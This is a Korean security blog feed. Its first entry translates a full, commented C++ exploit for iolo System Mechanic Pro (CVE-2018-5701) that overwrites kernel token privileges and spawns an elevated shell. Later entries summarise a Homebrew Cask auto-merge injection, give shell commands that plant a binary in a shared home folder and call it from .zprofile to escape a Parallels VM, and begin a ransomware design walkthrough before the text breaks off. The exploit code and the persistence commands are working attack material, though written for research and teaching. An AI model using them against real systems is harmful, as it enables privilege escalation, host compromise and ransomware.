href="#Abusing-Token-Privileges-for-LPE" class="headerlink" title="Abusing Token Privileges for LPE"></a>Abusing Token Privileges for LPE</h1><p>성공적인 권한 상승을 위해 다음과 같은 기술을 사용할 수 있다.</p><ol><li>SYSTEM의 토큰을 탈취해 프로세스를 대체하는 데 사용한다.</li><li>프로세스의 토큰 값을 유지하는 커널 구조체를 overwrite한다.</li></ol><p>arbitrary write가 가능하므로 두 번째 경우를 고려해본다. Windows는 토큰 객체를 사용해 특정 스레드/프로세스의 보안 컨텍스트를 관리한다.(토큰 객체는 <code>nt!_TOKEN</code> 구조체로 표현됨) 시스템의 각 프로세스는 object access negotiations 혹은 권한 있는 시스템 작업 중에 사용되는 <code>EPROCESS</code> 구조체에 토큰 객체 참조가 있다. 이중 <code>_TOKEN*+ 0x40*</code>의 <code>_SEP_TOKEN_PRIVILEGES</code>가 권한 상승과 관련된 필드이다.</p><pre><code class="hljs c">kd&gt; dt nt!_SEP_TOKEN_PRIVILEGES c5d39c30+<span class="hljs-number">40</span>   +<span class="hljs-number">0x000</span> Present          : <span class="hljs-number">0x00000006</span>`<span class="hljs-number">02880000</span>   +<span class="hljs-number">0x008</span> Enabled          : <span class="hljs-number">0x800000</span>  +<span class="hljs-number">0x010</span> EnabledByDefault : <span class="hljs-number">0x800000</span></code></pre><p><code>Present</code> : 토큰에 대한 현재 권한</p><p><code>Enable</code> : 토큰에 대해 활성화된 모든 권한. <code>SeSinglePrivilegeCheck</code>를 전달하려면 이 비트 마스크에서 권한을 활성화해야 한다.</p><p><code>EnableByDefault</code> : 토큰의 초기 상태</p><p><code>Present</code> 및 <code>Enabled</code> 항목을 <code>0xFFFFFFFF</code> 값으로 overwrite 하면 비트 마스크의 모든 비트와 권한을 활성화할 수 있다. 따라서 <code>0xFFFFFFFE</code> 를 쓰는 것이 우리에게 필요한 전부이다.</p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>exploit은 다음 단계를 수행한다.</p><ol><li>현재 프로세스의 토큰을 연다. - 나중에 커널 주소를 찾을 때 사용된다.</li><li><code>NtQuerySystemInformation</code> API로 핸들이 있는 모든 객체의 커널 주소를 leak 한다.</li><li>현재 프로세스에서 토큰 핸들을 찾고 <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization#Microsoft_Windows">kASLR</a>을 우회해 커널 주소를 가져온다.</li><li><code>0xFFFFFFFE</code>을 반환하는 취약한 드라이버에 대한 IOCTL 요청 코드를 작성하고 <code>Present</code> 필드를 가리키도록 출력 버퍼 주소를 설정한다.</li><li>같은 방법으로 <code>Enabled</code> 및 <code>EnabledByDefault</code> 필드를 <code>0xFFFFFFFE</code>로 overwrite 한다. </li><li>위에서 부여한 토큰 권한을 상속하는 자식 프로세스를 생성한다.</li></ol><p>항상 그랬듯이 주석이 달린 C++ exploit code는 여기 또는 <a href="https://github.com/VoidSec/Exploit-Development/blob/master/windows/x64/kernel/iolo_System_Mechanic_Pro_v.15.5.0.61/iolo_System_Mechanic_Pro_v.15.5.0.61.cpp">Github</a> 페이지에서 찾을 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><span class="hljs-comment">Exploit title:      iolo System Mechanic Pro v. &lt;= 15.5.0.61 - Arbitrary Write Local Privilege Escalation (LPE)</span><span class="hljs-comment">Exploit Authors:    Federico Lagrasta aka last - https://blog.notso.pro/</span><span class="hljs-comment">                    Paolo Stagno aka VoidSec - voidsec@voidsec.com - https://voidsec.com</span><span class="hljs-comment">CVE:                CVE-2018-5701</span><span class="hljs-comment">Date:               28/03/2021</span><span class="hljs-comment">Vendor Homepage:    https://www.iolo.com/</span><span class="hljs-comment">Download:           https://www.iolo.com/products/system-mechanic-ultimate-defense/</span><span class="hljs-comment">                    https://mega.nz/file/xJgz0QYA#zy0ynELGQG8L_VAFKQeTOK3b6hp4dka7QWKWal9Lo6E</span><span class="hljs-comment">Version:            v.15.5.0.61</span><span class="hljs-comment">Tested on:          Windows 10 Pro x64 v.1903 Build 18362.30</span><span class="hljs-comment">Category:           local exploit</span><span class="hljs-comment">Platform:           windows</span><span class="hljs-comment">*/</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOCTL_CODE 0x226003 <span class="hljs-comment">// IOCTL_CODE value, used to reach the vulnerable function (taken from IDA)</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SystemHandleInformation 0x10</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SystemHandleInformationSize 1024 * 1024 * 2</span><span class="hljs-comment">// define the buffer structure which will be sent to the vulnerable driver</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Exploit</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-keyword">uint32_t</span> Field1_1;  <span class="hljs-comment">// must be 0x8 as this index will be used to calculate the address in a jump table and trigger the vulnerable function</span>    <span class="hljs-keyword">uint32_t</span> Field1_2;  <span class="hljs-comment">// &quot;padding&quot; can be anything</span>    <span class="hljs-keyword">int</span> *Field2;        <span class="hljs-comment">// must be a pointer that, once dereferenced, cotains 0</span>    <span class="hljs-keyword">void</span> *Field3;       <span class="hljs-comment">// points to the adrress that will be overwritten by 0xfffffffe - Arbitrary Write</span>&#125;;<span class="hljs-comment">// define a pointer to the native function &#x27;NtQuerySystemInformation&#x27;</span><span class="hljs-keyword">using</span> pNtQuerySystemInformation = NTSTATUS(WINAPI *)(    ULONG SystemInformationClass,    PVOID SystemInformation,    ULONG SystemInformationLength,    PULONG ReturnLength);<span class="hljs-comment">// define the SYSTEM_HANDLE_TABLE_ENTRY_INFO structure</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SYSTEM_HANDLE_TABLE_ENTRY_INFO</span></span><span class="hljs-class">&#123;</span>    USHORT UniqueProcessId;    USHORT CreatorBackTraceIndex;    UCHAR ObjectTypeIndex;    UCHAR HandleAttributes;    USHORT HandleValue;    PVOID Object;    ULONG GrantedAccess;&#125; SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;<span class="hljs-comment">// define the SYSTEM_HANDLE_INFORMATION structure</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SYSTEM_HANDLE_INFORMATION</span></span><span class="hljs-class">&#123;</span>    ULONG NumberOfHandles;    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[<span class="hljs-number">1</span>];&#125; SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open a handle to the device exposed by the driver - symlink is \\.\amp</span>    HANDLE device = ::CreateFileW(        <span class="hljs-string">L&quot;\\\\.\\amp&quot;</span>,        GENERIC_WRITE | GENERIC_READ,        <span class="hljs-literal">NULL</span>,        <span class="hljs-literal">nullptr</span>,        OPEN_EXISTING,        <span class="hljs-literal">NULL</span>,        <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (device == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t open handle to the System Mechanic driver. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Opened a handle to the System Mechanic driver!\n&quot;</span>;    <span class="hljs-comment">// resolve the address of NtQuerySystemInformation and assign it to a function pointer</span>    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)::GetProcAddress(::LoadLibraryW(<span class="hljs-string">L&quot;ntdll&quot;</span>), <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);    <span class="hljs-keyword">if</span> (!NtQuerySystemInformation)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t resolve NtQuerySystemInformation API. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Resolved NtQuerySystemInformation!\n&quot;</span>;    <span class="hljs-comment">// open the current process token - it will be used to retrieve its kernelspace address later</span>    HANDLE currentProcess = ::GetCurrentProcess();    HANDLE currentToken = <span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">bool</span> success = ::OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &amp;currentToken);    <span class="hljs-keyword">if</span> (!success)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t open handle to the current process token. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Opened a handle to the current process token!\n&quot;</span>;    <span class="hljs-comment">// allocate space in the heap for the handle table information which will be filled by the call to &#x27;NtQuerySystemInformation&#x27; API</span>    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(::GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);    <span class="hljs-comment">// call NtQuerySystemInformation and fill the handleTableInformation structure</span>    ULONG returnLength = <span class="hljs-number">0</span>;    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &amp;returnLength);    <span class="hljs-keyword">uint64_t</span> tokenAddress = <span class="hljs-number">0</span>;    <span class="hljs-comment">// iterate over the system&#x27;s handle table and look for the handles beloging to our process</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; handleTableInformation-&gt;NumberOfHandles; i++)    &#123;        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation-&gt;Handles[i];        <span class="hljs-comment">// if it finds our process and the handle matches the current token handle we already opened, print it</span>        <span class="hljs-keyword">if</span> (handleInfo.UniqueProcessId == ::GetCurrentProcessId() &amp;&amp; handleInfo.HandleValue == (USHORT)currentToken)        &#123;            tokenAddress = (<span class="hljs-keyword">uint64_t</span>)handleInfo.Object;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Current token address in kernelspace is: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; tokenAddress &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        &#125;    &#125;    <span class="hljs-comment">// allocate a variable set to 0</span>    <span class="hljs-keyword">int</span> field2 = <span class="hljs-number">0</span>;    <span class="hljs-comment">/*</span><span class="hljs-comment">    dt nt!_SEP_TOKEN_PRIVILEGES</span><span class="hljs-comment">       +0x000 Present          : Uint8B</span><span class="hljs-comment">       +0x008 Enabled          : Uint8B</span><span class="hljs-comment">       +0x010 EnabledByDefault : Uint8B</span><span class="hljs-comment"></span><span class="hljs-comment">    We&#x27;ve added +1 to the offsets to ensure that the low bytes part are 0xff.</span><span class="hljs-comment">    */</span>    <span class="hljs-comment">// overwrite the _SEP_TOKEN_PRIVILEGES  &quot;Present&quot; field in the current process token</span>    Exploit exploit =        &#123;            <span class="hljs-number">8</span>,            <span class="hljs-number">0</span>,            &amp;field2,            (<span class="hljs-keyword">void</span> *)(tokenAddress + <span class="hljs-number">0x41</span>)&#125;;    <span class="hljs-comment">// overwrite the _SEP_TOKEN_PRIVILEGES  &quot;Enabled&quot; field in the current process token</span>    Exploit exploit2 =        &#123;            <span class="hljs-number">8</span>,            <span class="hljs-number">0</span>,            &amp;field2,            (<span class="hljs-keyword">void</span> *)(tokenAddress + <span class="hljs-number">0x49</span>)&#125;;    <span class="hljs-comment">// overwrite the _SEP_TOKEN_PRIVILEGES  &quot;EnabledByDefault&quot; field in the current process token</span>    Exploit exploit3 =        &#123;            <span class="hljs-number">8</span>,            <span class="hljs-number">0</span>,            &amp;field2,            (<span class="hljs-keyword">void</span> *)(tokenAddress + <span class="hljs-number">0x51</span>)&#125;;    DWORD bytesReturned = <span class="hljs-number">0</span>;    success = DeviceIoControl(        device,        IOCTL_CODE,        &amp;exploit,        <span class="hljs-keyword">sizeof</span>(exploit),        <span class="hljs-literal">nullptr</span>,        <span class="hljs-number">0</span>,        &amp;bytesReturned,        <span class="hljs-literal">nullptr</span>);    <span class="hljs-keyword">if</span> (!success)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t overwrite current token &#x27;Present&#x27; field. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Successfully overwritten current token &#x27;Present&#x27; field!\n&quot;</span>;    success = DeviceIoControl(        device,        IOCTL_CODE,        &amp;exploit2,        <span class="hljs-keyword">sizeof</span>(exploit2),        <span class="hljs-literal">nullptr</span>,        <span class="hljs-number">0</span>,        &amp;bytesReturned,        <span class="hljs-literal">nullptr</span>);    <span class="hljs-keyword">if</span> (!success)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t overwrite current token &#x27;Enabled&#x27; field. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Successfully overwritten current token &#x27;Enabled&#x27; field!\n&quot;</span>;    success = DeviceIoControl(        device,        IOCTL_CODE,        &amp;exploit3,        <span class="hljs-keyword">sizeof</span>(exploit3),        <span class="hljs-literal">nullptr</span>,        <span class="hljs-number">0</span>,        &amp;bytesReturned,        <span class="hljs-literal">nullptr</span>);    <span class="hljs-keyword">if</span> (!success)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t overwrite current token &#x27;EnabledByDefault&#x27; field. Error code:&quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Successfully overwritten current token &#x27;EnabledByDefault&#x27; field!\n&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Token privileges successfully overwritten!\n&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Spawning a new shell with full privileges!\n&quot;</span>;    system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">    |\__/,|   (`\</span><span class="hljs-comment">  _.|o o  |_   ) )</span><span class="hljs-comment">-(((---(((--------</span><span class="hljs-comment">*/</span></code></pre><h1 id="Video-PoC"><a href="#Video-PoC" class="headerlink" title="Video PoC"></a>Video PoC</h1><p><a href="https://www.youtube.com/watch?v=IIARwtJEhxs&feature=emb_title">https://www.youtube.com/watch?v=IIARwtJEhxs&amp;feature=emb_title</a></p><h1 id="Upcoming-Article"><a href="#Upcoming-Article" class="headerlink" title="Upcoming Article"></a>Upcoming Article</h1><p>일부 공급 업체의 제약으로 인해 약간 연기해야 했으며 다음 블로그 게시물에서는 인기있는 애플리케이션에서 임의 파일 쓰기에서 권한 상승 (EoP)으로 넘어가도록 한 일련의 버그를 공개 할 예정이다.</p><h1 id="Resources-amp-References"><a href="#Resources-amp-References" class="headerlink" title="Resources &amp; References"></a>Resources &amp; References</h1><ul><li><a href="https://www.youtube.com/watch?v=qk-OI8Z-1To">Driver Attack Surface</a></li><li><a href="https://github.com/Microsoft/Windows-Driver-Frameworks">Windows DriverFrameworks</a></li><li><a href="https://www.exploit-db.com/exploits/42556">Abusing Token Privileges for LPE</a></li><li><a href="https://twitter.com/HackSysTeam">@HackSysTeam</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>ioctl</tag>
      
      <tag>L0ch</tag>
      
      <tag>driver</tag>
      
      <tag>exploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Homebrew package manager의 RCE 취약점</title>
    <link href="/2021/04/27/l0ch/2021-04-27/"/>
    <url>/2021/04/27/l0ch/2021-04-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1167608">Broken parsing of Git diff allows an attacker to inject arbitrary Ruby scripts to Casks on official taps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Homebrew</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MacOs, Linux에서 사용되는 오픈소스 커맨드 라인 패키지 매니저인 Homebrew의 Homebrew Cask에서 원격 코드 실행 취약점이 발견되었습니다. Homebrew Cask는 커맨드 라인에서 GUI 기반 어플리케이션 패키지를 관리할 수 있습니다. </p><p>취약점은 Homebrew-cask의 github 저장소 관리에 존재합니다. Homebrew-cask에는 <code>Review-cask-pr</code> github action이 존재하며 해당 action은 <code>git_diff</code> 를 사용해 pull request된 코드의 변경점을 파싱하고 변경점이 크지 않고 간단한 경우 이를 자동으로 merge합니다. 이때 <code>git_diff</code> 는 다음과 같이 파일을 파싱합니다.</p><ol><li>각 행에 대해 <code>^diff --git(?: a/(\S+))?(?: b/(\S+))?</code> 정규식과 일치하는 경우 현재 처리중인 파일 정보를 정규식과 일치하는 코드로 변경합니다.</li><li>1단계가 일치하지 않는 경우 <code>git_diff/file.rb</code>의 <code>extract_diff_meta_data</code> 함수의 정규식 중 하나와 일치하는지 확인하고 파일 경로를 변경합니다. </li><li>2단계가 일치하지 않는 경우 파일 내용에 대한 변경으로 처리해 <code>+</code>, <code>-</code>에 따라 코드 추가 또는 삭제로 처리합니다.</li></ol><p>만약 변경된 파일 내용이 <code>++ &quot;?b/(.*)</code> 형식으로 시작하면 <code>extract_diff_meta_data</code> 함수의 정규식 중 아래 정규식에 매칭되어 파일 내용에 대한 변경이 아닌 파일 경로 정보로 처리됩니다. 따라서 파일 내용 변경점이 없는 pull request로 자동으로 merge될 수 있습니다.</p><pre><code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_diff_meta_data</span><span class="hljs-params">(string)</span></span>...<span class="hljs-keyword">elsif</span> b_path_info = <span class="hljs-regexp">%r&#123;^[+]&#123;3&#125;</span> <span class="hljs-string">&quot;?b/(.*)$&#125;.match(string)</span><span class="hljs-string">@b_path = b_path_info[1]</span><span class="hljs-string">...</span></code></pre><p>위 취약점은 다음과 같이 악용될 수 있습니다.</p><ol><li><p>Homebrew/Casks에 포함된 루비파일에 임의 코드를 포함한 아래 코드를 추가합니다.</p> <pre><code class="hljs c">++ <span class="hljs-string">&quot;b/#&#123;arbitrary code&#125;&quot;</span>++ b/Casks/iterm2.r</code></pre></li><li><p>pull request를 보내면 <code>git_diff</code>가 파일 경로정보로 처리해 추가된 코드가 무시되고 <code>Review-cask-pr</code> action에서는 변경점이 없는 코드로 인식해 자동으로 저장소에 merge됩니다.</p></li><li><p>merge된 버전의 패키지를 사용하는 PC에서 원격 코드 실행이 가능합니다.</p></li></ol><p>해당 취약점은 자동으로 pull request를 검사하고 merge하는 <code>automerge</code> 및 <code>review-cask-pr</code> github action을 제거하고 수동으로 검사 및 승인하도록 패치되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>github</tag>
      
      <tag>homebrew</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Full VM escape Parallels Desktop on Intel and M1</title>
    <link href="/2021/04/26/idioth/2021-04-26/"/>
    <url>/2021/04/26/idioth/2021-04-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://zerodayengineering.com/blog/dont-share-your-home.html">Don’t Share Your $HOME with Untrusted Guests</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>4월 23일 기준 Parallels Desktop 최신 버전(Parallels Desktop 16.5.0 both Intel and M1)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>매킨토시 컴퓨터에 하드웨어 가상화를 제공하는 Parallels Desktop에서 Guest OS와 <code>$HOME</code> 디렉터리를 공유하여 발생하는 VM Escape가 발견되었습니다.</p><p>Parallels는 기본 값으로 호스트 운영체제(MacOS)의 사용자 홈 디렉터리를 Parallels 공유 폴더로 게스트 OS에 공유합니다. MacOS에서 interactive shell binary는 다른 유닉스 기반 OS와 동일하게 터미널이 열릴 때마다 실행되며 bash profile을 참조합니다. 이를 이용하여 공유 홈 디렉터리에 악성 바이너리를 삽입한 후 <code>.zprofile</code>이나 다른 shell profile file에서 호출하면 바이너리는 터미널이 시작될 때마다 호스트 OS에서 실행됩니다. 이를 통해 지속적으로 호스트 OS에 RCE가 가능합니다.</p><p>POC는 다음과 같으며 악성 바이너리 샘플은 <a href="https://github.com/badd1e/Proof-of-Concept/tree/main/prl_not0day">github</a>에서 확인하실 수 있습니다.</p><pre><code class="hljs awk">cp mybinary <span class="hljs-regexp">/media/</span>psf<span class="hljs-regexp">/Home/</span>.hellochmod +x <span class="hljs-regexp">/media/</span>psf<span class="hljs-regexp">/Home/</span>.helloecho <span class="hljs-string">&quot;~/.hello&quot;</span> &gt;&gt; <span class="hljs-regexp">/media/</span>psf<span class="hljs-regexp">/Home/</span>.zprofile</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mac</tag>
      
      <tag>idioth</tag>
      
      <tag>parallels</tag>
      
      <tag>vm escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Architecture of Ransomware Part 2</title>
    <link href="/2021/04/25/idioth/arch_of_ransomware_part2/"/>
    <url>/2021/04/25/idioth/arch_of_ransomware_part2/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요! idioth입니다. 길고 길었던 중간고사 기간이었습니다. 하지만 제 중간고사 기간은 더 길어서 아직 끝나지 않았네요. 시험 하나와 대체 과제 3개가 남아있는 삶입니다. 게다가 과목 하나는 양이 너무 많아서 선택과 집중을 했는데 제가 선택한 부분에서 12 문제 중 한 문제 나왔네요. 10점 밑으로 받을 것 같습니다. 하하하하하하하하하하</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled.png"></p><p>이미 지나간 일 후회하지 않겠습니다… 기말 때 더 잘하면 되니까요^^. 잡담이 길었습니다. 오늘은 저번 게시글에 이어서 파트 2를 진행하도록 하겠습니다!</p><p>이전 게시글 보러가기: <a href="https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/">[Translation] Architecture of Ransomware Part 1</a></p><hr><blockquote><p>원문 글 : <a href="https://infosecwriteups.com/architecture-of-a-ransomware-2-2-e22d8eb11cee">Architecture of a ransomware (2/2)</a></p></blockquote><p><a href="https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/">Part 1</a>에서 랜섬웨어가 효과적으로 동작하는데 필요한 주요한 개념에 대해서 설명했다. 이번 파트에서 파이썬 코드를 통해 개념들을 보여줄 것이다. 또한 암호화를 위한 pycryptodome 파이썬 라이브러리의 기본적인 사용법도 다룰 것이다. 스크립트 키디들이 악용할 수 없도록 전체 소스 코드를 올리진 않을 것이다. 이 게시글의 목적은 악성 행위에 사용하라는 것이 아니라 랜섬웨어 악성코드에 대한 지식을 공유하는 것이다.</p><h1 id="일반적인-고려-사항"><a href="#일반적인-고려-사항" class="headerlink" title="일반적인 고려 사항"></a>일반적인 고려 사항</h1><p>여러 개의 오픈 소스 랜섬웨어가 존재하며 랜섬웨어 개발에 관해서 찾아보다가 <a href="https://medium.com/u/ea2f2c25847b?source=post_page-----e22d8eb11cee--------------------------------">Tarcísio Marinho</a>가 개발한 <a href="https://github.com/tarcisio-marinho/GonnaCry">GonnaCry</a>라는 랜섬웨어를 발견했다. 코드가 매우 분명하며 읽어 보는 것을 추천한다.</p><p>그의 랜섬웨어는 “management side”를 위한 모든 코드가 포함되어 있다. 그는 복호화 키를 관리하고 감염된 클라이언트와 통신하는 해커 측 서버를 코딩했다.</p><p>필자는 랜섬웨어가 어떻게 동작하는지 배우기 위해 모든 코드를 작성하였고, 실제 랜섬웨어는 이 부분을 모두 다르게 처리하므로 해당 부분은 다루고 싶지 않았다. payment를 등록하고 복호화 키를 전송하는 자동화 서비스, victim과 직접 상호작용하는 토르 이메일 주소, 몇 개의 샘플 파일을 통해 복호화할 수 있는지 확인하는 시스템 등이 있을 수도 있다. 이 부분은 캠페인마다 달라서 다루지 않을 것이다. 나는 클라이언트 감염 측면에 주로 포커스를 맞출 것이다.</p><h1 id="언어-선택"><a href="#언어-선택" class="headerlink" title="언어 선택"></a>언어 선택</h1><p>필자는 몇 가지 이유로 파이썬을 선택했다. 주요한 이유는 ㄹㅇ 읽기 쉽고 이해하기 쉬우니까.</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%201.png"></p><p><code>os.system</code>으로 호출된 OS별 명령어를 사용하지 않으면 크로스 플랫폼 또한 가능하다. 또한 속도가 빠르고 암호화를 위한 라이브러리가 있다. 마지막으로 컴파일된 코드 난독화가 가능하여 리버싱하기 어렵게 만들 수 있다.</p><p>파이썬 라이브러리를 선택할 때 동일한 기능을 하는 걸 여러 개 찾아라. 각각의 것을 연구하고 가장 많이 사용되는 것을 선택하는 것은 암호화처럼 빠르게 변화하는 것에 대해서 좋은 접근 방식이다. 오래된 라이브러리를 사용하거나 <a href="https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/">Lockcrypt</a>처럼 자체 개발한 암호화를 사용(하지 마)하면 랜섬웨어가 복호화될 수도 있다.  우리는 잘 알려진 라이브러리 <a href="https://pypi.org/project/pycryptodome/">pycryptodome</a>과 <a href="https://docs.python.org/3/library/secrets.html">secrets</a>를 사용할 것이다.</p><blockquote><p>Note: 실제로 비대칭+대칭 암호화를 결합한 wrapper가 있지만 개념을 설명하기 위해 pycryptodome을 사용해 각 기능을 구현할 것이다.</p></blockquote><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%202.png"></p><h1 id="필요한-기능-요약"><a href="#필요한-기능-요약" class="headerlink" title="필요한 기능 요약"></a>필요한 기능 요약</h1><ul><li><code>generate32ByteKey()</code>: 랜덤한 32바이트 키를 생성한다. 이를 수행하기 위한 여러 가지 방법이 있다. <code>/dev/urandom</code>에서 문자열을 긁어와서 <code>sha256sum</code>을 하면 되지만 리눅스에 한정적이며 크로스 플랫폼으로 만들고 싶으므로 secrets 라이브러리를 사용할 것이다. <code>secrets.token_hex(32)</code>를 통해 수행할 수 있다.</li><li><code>rsaEncryptSecret(string, publicKey)</code>: public key를 가지고 secret을 비대칭 암호화한다(private key를 통해서만 복호화됨). 이렇게 하면 각 파일에 대해 생성된 대칭 키를 publicKey로 암호화할 수 있다. 클라이언트는 각 파일의 대칭 키를 복호화하려면 우리의 private key가 필요하다.</li><li><code>rsaDecryptSecret(secret, privateKey)</code>: private 비대칭 키를 통해 암호화된 대칭키를 복호화한다.</li><li><code>symEncryptFile(publicKey, 